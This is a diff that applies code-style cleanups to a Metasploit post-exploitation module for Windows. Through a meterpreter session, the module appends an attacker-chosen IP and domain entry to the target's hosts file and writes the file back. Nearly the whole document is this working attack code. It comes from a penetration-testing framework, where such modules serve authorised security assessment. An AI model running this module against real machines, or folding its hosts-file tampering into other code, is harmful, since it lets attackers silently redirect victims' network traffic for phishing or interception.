@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,30 +7,28 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Manage Hosts File Injection',
-      'Description'   => %q{
-        This module allows the attacker to insert a new entry into the target
-        system's hosts file.
-      },
-      'License'       => BSD_LICENSE,
-      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                      'Name'          => 'Windows Manage Hosts File Injection',
+                      'Description'   => %q(
+                        This module allows the attacker to insert a new entry into the target
+                        system's hosts file.
+                      ),
+                      'License'       => BSD_LICENSE,
+                      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
 
     register_options(
       [
         OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
         OptString.new('IP', [ true, 'IP address to point domain name to.' ])
-      ], self.class)
+      ], self.class
+    )
   end
 
-
   def run
-    if datastore['IP'].nil? or datastore['DOMAIN'].nil?
+    if datastore['IP'].nil? || datastore['DOMAIN'].nil?
       print_error("Please specify both DOMAIN and IP")
       return
     end
@@ -48,15 +47,13 @@ class MetasploitModule < Msf::Post
     rescue RequestError => re
       # If the file doesn't exist, then it's okay.  Otherwise, throw the
       # error.
-      if re.result != 2
-        raise $!
-      end
+      raise $ERROR_INFO if re.result != 2
     end
 
     print_status("Inserting hosts file entry pointing #{hostname} to #{ip}..")
     hostsfile = ::File.open(temp_path, 'ab')
     hostsfile.write("\r\n#{ip}\t#{hostname}")
-    hostsfile.close()
+    hostsfile.close
 
     client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', temp_path)
     print_good("Done!")
